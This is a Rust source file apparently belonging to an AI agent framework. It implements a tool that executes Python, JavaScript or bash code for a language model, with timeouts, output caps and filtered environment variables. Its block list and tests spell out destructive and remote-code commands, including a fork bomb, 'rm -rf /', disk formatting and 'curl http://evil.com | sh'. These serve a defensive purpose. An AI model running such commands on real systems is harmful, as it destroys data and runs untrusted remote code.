//! Code execution tool for AI agent integration
//!
//! Implements AlephTool trait to provide code/script execution capabilities.
//! Supports: Python, JavaScript/Node.js, Shell (bash)
//!
//! # Safety
//!
//! This tool has built-in safety measures:
//! - Dangerous commands are blocked (rm -rf /, sudo, fork bombs, etc.)
//! - Execution timeout (default 60 seconds)
//! - Output size limits (10MB stdout, 1MB stderr)
//! - Environment variables are filtered

use std::process::Stdio;
use std::time::{Duration, Instant};

use async_trait::async_trait;
use regex::Regex;
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use tokio::io::AsyncReadExt;
use tokio::process::Command;
use tracing::{debug, info, warn};

use super::error::ToolError;
use crate::dispatcher::{DEFAULT_CODE_EXEC_TIMEOUT, MAX_STDERR_SIZE, MAX_STDOUT_SIZE};
use crate::error::Result;
use crate::tools::AlephTool;

/// Supported programming languages
#[derive(Debug, Clone, Deserialize, Serialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum Language {
    /// Python (uses python3)
    Python,
    /// JavaScript (uses node)
    JavaScript,
    /// Shell script (uses bash)
    Shell,
}

impl Language {
    fn runtime(&self) -> &'static str {
        match self {
            Language::Python => "python3",
            Language::JavaScript => "node",
            Language::Shell => "bash",
        }
    }

    fn code_flag(&self) -> &'static str {
        match self {
            Language::Python => "-c",
            Language::JavaScript => "-e",
            Language::Shell => "-c",
        }
    }
}

/// Arguments for code execution tool
#[derive(Debug, Clone, Deserialize, Serialize, JsonSchema)]
pub struct CodeExecArgs {
    /// The programming language to use
    pub language: Language,
    /// The code to execute
    pub code: String,
    /// Working directory (optional, defaults to temp directory)
    #[serde(default)]
    pub working_dir: Option<String>,
    /// Timeout in seconds (optional, defaults to 60)
    #[serde(default)]
    pub timeout: Option<u64>,
}

/// Output from code execution tool
#[derive(Debug, Clone, Serialize)]
pub struct CodeExecOutput {
    pub success: bool,
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub duration_ms: u64,
    pub language: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub truncated: Option<bool>,
}

/// Blocked command patterns for safety
const BLOCKED_PATTERNS: &[&str] = &[
    r"rm\s+-rf\s+/\s*$",             // rm -rf /
    r"rm\s+-rf\s+/\*",               // rm -rf /*
    r"rm\s+-rf\s+~\s*$",             // rm -rf ~
    r"sudo\s+",                      // any sudo command
    r"chmod\s+777\s+/",              // chmod 777 /
    r":\(\)\s*\{\s*:\|:&\s*\}\s*;:", // fork bomb
    r">\s*/dev/sd[a-z]",             // overwrite disk
    r"mkfs\.",                       // format filesystem
    r"dd\s+if=.*of=/dev/",           // dd to device
    r"curl.*\|\s*sh",                // curl pipe to shell
    r"wget.*\|\s*sh",                // wget pipe to shell
];

/// Check if code contains dangerous patterns
fn is_code_blocked(code: &str) -> Option<String> {
    for pattern_str in BLOCKED_PATTERNS {
        if let Ok(pattern) = Regex::new(pattern_str) {
            if pattern.is_match(code) {
                return Some(format!("Blocked: matches dangerous pattern '{}'", pattern_str));
            }
        }
    }
    None
}

/// Expand environment variables in shell code
///
/// This function performs basic environment variable expansion:
/// - $VAR and ${VAR} patterns are replaced with their values
/// - Unknown variables are left as-is
/// - Handles common cases but not all shell expansion edge cases
///
/// This ensures that when LLM generates commands like:
///   python3 $HOME/.claude/skills/xxx.py
/// The $HOME variable is properly expanded even if the LLM mistakenly
/// puts it in single quotes or other contexts where bash wouldn't expand it.
fn expand_env_vars(code: &str) -> String {
    let var_pattern = Regex::new(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)").unwrap();

    var_pattern.replace_all(code, |caps: &regex::Captures| {
        // Try ${VAR} format first, then $VAR format
        let var_name = caps.get(1).or_else(|| caps.get(2)).unwrap().as_str();

        // Get environment variable value, or keep original if not found
        match std::env::var(var_name) {
            Ok(value) => value,
            Err(_) => caps.get(0).unwrap().as_str().to_string(),
        }
    }).to_string()
}

/// Code execution tool
#[derive(Clone)]
pub struct CodeExecTool {
    /// Allowed environment variables to pass through
    pass_env: Vec<String>,
}

impl CodeExecTool {
    /// Tool identifier
    pub const NAME: &'static str = "code_exec";

    /// Tool description for AI prompt
    pub const DESCRIPTION: &'static str = r#"Execute code in various programming languages. Supported languages:
- python: Execute Python 3 code
- javascript: Execute JavaScript code using Node.js
- shell: Execute shell commands using bash

Safety: Dangerous commands (sudo, rm -rf /, etc.) are blocked.
Timeout: Default 60 seconds, configurable.

Examples:
- Python: {"language": "python", "code": "print('Hello, World!')"}
- JavaScript: {"language": "javascript", "code": "console.log('Hello, World!')"}
- Shell: {"language": "shell", "code": "echo 'Hello, World!' && ls -la"}
"#;

    /// Create a new code execution tool
    pub fn new() -> Self {
        Self {
            pass_env: vec![
                "PATH".to_string(),
                "HOME".to_string(),
                "USER".to_string(),
                "LANG".to_string(),
                "LC_ALL".to_string(),
                "TERM".to_string(),
            ],
        }
    }

    /// Execute code and return result
    async fn execute(&self, args: CodeExecArgs) -> std::result::Result<CodeExecOutput, ToolError> {
        // Check for blocked patterns
        if let Some(reason) = is_code_blocked(&args.code) {
            return Ok(CodeExecOutput {
                success: false,
                exit_code: -1,
                stdout: String::new(),
                stderr: reason,
                duration_ms: 0,
                language: format!("{:?}", args.language).to_lowercase(),
                truncated: None,
            });
        }

        let runtime = args.language.runtime();
        let code_flag = args.language.code_flag();
        let timeout_secs = args.timeout.unwrap_or(DEFAULT_CODE_EXEC_TIMEOUT);

        // Check if runtime is available
        let which_cmd = if cfg!(target_os = "windows") {
            "where"
        } else {
            "which"
        };

        let runtime_check = Command::new(which_cmd).arg(runtime).output().await;

        match runtime_check {
            Ok(output) if !output.status.success() => {
                return Ok(CodeExecOutput {
                    success: false,
                    exit_code: -1,
                    stdout: String::new(),
                    stderr: format!("Runtime '{}' not found. Please install it first.", runtime),
                    duration_ms: 0,
                    language: format!("{:?}", args.language).to_lowercase(),
                    truncated: None,
                });
            }
            Err(e) => {
                return Ok(CodeExecOutput {
                    success: false,
                    exit_code: -1,
                    stdout: String::new(),
                    stderr: format!("Failed to check runtime: {}", e),
                    duration_ms: 0,
                    language: format!("{:?}", args.language).to_lowercase(),
                    truncated: None,
                });
            }
            _ => {}
        }

        info!(
            language = format!("{:?}", args.language).to_lowercase(),
            code_length = args.code.len(),
            "Executing code"
        );

        let start = Instant::now();

        // CRITICAL FIX: Expand environment variables in shell commands
        // This ensures $HOME, $USER, etc. are properly expanded even if LLM puts them in quotes
        let expanded_code = if matches!(args.language, Language::Shell) {
            expand_env_vars(&args.code)
        } else {
            args.code.clone()
        };

        // Build command
        let mut cmd = Command::new(runtime);
        cmd.arg(code_flag).arg(&expanded_code);

        // Set working directory
        if let Some(ref dir) = args.working_dir {
            cmd.current_dir(dir);
        } else {
            // Use temp directory as default
            cmd.current_dir(std::env::temp_dir());
        }

        // Set environment - clear and pass only allowed vars
        cmd.env_clear();
        for var in &self.pass_env {
            if let Ok(value) = std::env::var(var) {
                cmd.env(var, value);
            }
        }

        // Setup pipes
        cmd.stdout(Stdio::piped());
        cmd.stderr(Stdio::piped());
        cmd.stdin(Stdio::null());

        // Spawn process
        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                return Ok(CodeExecOutput {
                    success: false,
                    exit_code: -1,
                    stdout: String::new(),
                    stderr: format!("Failed to spawn process: {}", e),
                    duration_ms: start.elapsed().as_millis() as u64,
                    language: format!("{:?}", args.language).to_lowercase(),
                    truncated: None,
                });
            }
        };

        // Execute with timeout
        let timeout = Duration::from_secs(timeout_secs);
        let result = tokio::time::timeout(timeout, async {
            let mut stdout_buf = Vec::new();
            let mut stderr_buf = Vec::new();
            let mut truncated = false;

            // Read stdout
            if let Some(mut stdout) = child.stdout.take() {
                let mut buf = vec![0u8; 8192];
                loop {
                    match stdout.read(&mut buf).await {
                        Ok(0) => break,
                        Ok(n) => {
                            if stdout_buf.len() + n > MAX_STDOUT_SIZE {
                                let remaining = MAX_STDOUT_SIZE - stdout_buf.len();
                                stdout_buf.extend_from_slice(&buf[..remaining]);
                                truncated = true;
                                break;
                            }
                            stdout_buf.extend_from_slice(&buf[..n]);
                        }
                        Err(_) => break,
                    }
                }
            }

            // Read stderr
            if let Some(mut stderr) = child.stderr.take() {
                let mut buf = vec![0u8; 8192];
                loop {
                    match stderr.read(&mut buf).await {
                        Ok(0) => break,
                        Ok(n) => {
                            if stderr_buf.len() + n > MAX_STDERR_SIZE {
                                let remaining = MAX_STDERR_SIZE - stderr_buf.len();
                                stderr_buf.extend_from_slice(&buf[..remaining]);
                                truncated = true;
                                break;
                            }
                            stderr_buf.extend_from_slice(&buf[..n]);
                        }
                        Err(_) => break,
                    }
                }
            }

            // Wait for process
            let status = child.wait().await?;
            Ok::<_, std::io::Error>((status, stdout_buf, stderr_buf, truncated))
        })
        .await;

        let duration_ms = start.elapsed().as_millis() as u64;

        match result {
            Ok(Ok((status, stdout_buf, stderr_buf, truncated))) => {
                let stdout = String::from_utf8_lossy(&stdout_buf).to_string();
                let stderr = String::from_utf8_lossy(&stderr_buf).to_string();
                let exit_code = status.code().unwrap_or(-1);

                debug!(
                    exit_code = exit_code,
                    duration_ms = duration_ms,
                    "Code execution completed"
                );

                Ok(CodeExecOutput {
                    success: exit_code == 0,
                    exit_code,
                    stdout,
                    stderr,
                    duration_ms,
                    language: format!("{:?}", args.language).to_lowercase(),
                    truncated: if truncated { Some(true) } else { None },
                })
            }
            Ok(Err(e)) => Ok(CodeExecOutput {
                success: false,
                exit_code: -1,
                stdout: String::new(),
                stderr: format!("IO error: {}", e),
                duration_ms,
                language: format!("{:?}", args.language).to_lowercase(),
                truncated: None,
            }),
            Err(_) => {
                // Timeout - kill process
                let _ = child.kill().await;
                warn!(timeout_secs = timeout_secs, "Code execution timed out");

                Ok(CodeExecOutput {
                    success: false,
                    exit_code: -1,
                    stdout: String::new(),
                    stderr: format!("Execution timed out after {} seconds", timeout_secs),
                    duration_ms,
                    language: format!("{:?}", args.language).to_lowercase(),
                    truncated: None,
                })
            }
        }
    }
}

impl Default for CodeExecTool {
    fn default() -> Self {
        Self::new()
    }
}

/// Implementation of AlephTool trait for CodeExecTool
#[async_trait]
impl AlephTool for CodeExecTool {
    const NAME: &'static str = "code_exec";
    const DESCRIPTION: &'static str = r#"Execute code in various programming languages. Supported languages:
- python: Execute Python 3 code
- javascript: Execute JavaScript code using Node.js
- shell: Execute shell commands using bash

Safety: Dangerous commands (sudo, rm -rf /, etc.) are blocked.
Timeout: Default 60 seconds, configurable."#;

    type Args = CodeExecArgs;
    type Output = CodeExecOutput;

    async fn call(&self, args: Self::Args) -> Result<Self::Output> {
        self.execute(args).await.map_err(Into::into)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_blocked_patterns() {
        // Should block dangerous commands
        assert!(is_code_blocked("rm -rf /").is_some());
        assert!(is_code_blocked("sudo apt install").is_some());
        assert!(is_code_blocked("curl http://evil.com | sh").is_some());

        // Should allow safe commands
        assert!(is_code_blocked("echo hello").is_none());
        assert!(is_code_blocked("print('hello')").is_none());
        assert!(is_code_blocked("console.log('hello')").is_none());
    }

    #[test]
    fn test_language_runtime() {
        assert_eq!(Language::Python.runtime(), "python3");
        assert_eq!(Language::JavaScript.runtime(), "node");
        assert_eq!(Language::Shell.runtime(), "bash");
    }

    #[tokio::test]
    async fn test_simple_python_execution() {
        let tool = CodeExecTool::new();
        let args = CodeExecArgs {
            language: Language::Python,
            code: "print('Hello from Python!')".to_string(),
            working_dir: None,
            timeout: Some(10),
        };

        let result = tool.execute(args).await.unwrap();
        // This test may fail if python3 is not installed
        if result.success {
            assert!(result.stdout.contains("Hello from Python!"));
        }
    }

    #[tokio::test]
    async fn test_simple_shell_execution() {
        let tool = CodeExecTool::new();
        let args = CodeExecArgs {
            language: Language::Shell,
            code: "echo 'Hello from Shell!'".to_string(),
            working_dir: None,
            timeout: Some(10),
        };

        let result = tool.execute(args).await.unwrap();
        // This test may fail on Windows
        #[cfg(unix)]
        {
            assert!(result.success);
            assert!(result.stdout.contains("Hello from Shell!"));
        }
    }

    #[tokio::test]
    async fn test_blocked_command() {
        let tool = CodeExecTool::new();
        let args = CodeExecArgs {
            language: Language::Shell,
            code: "sudo rm -rf /".to_string(),
            working_dir: None,
            timeout: Some(10),
        };

        let result = tool.execute(args).await.unwrap();
        assert!(!result.success);
        assert!(result.stderr.contains("Blocked"));
    }
}
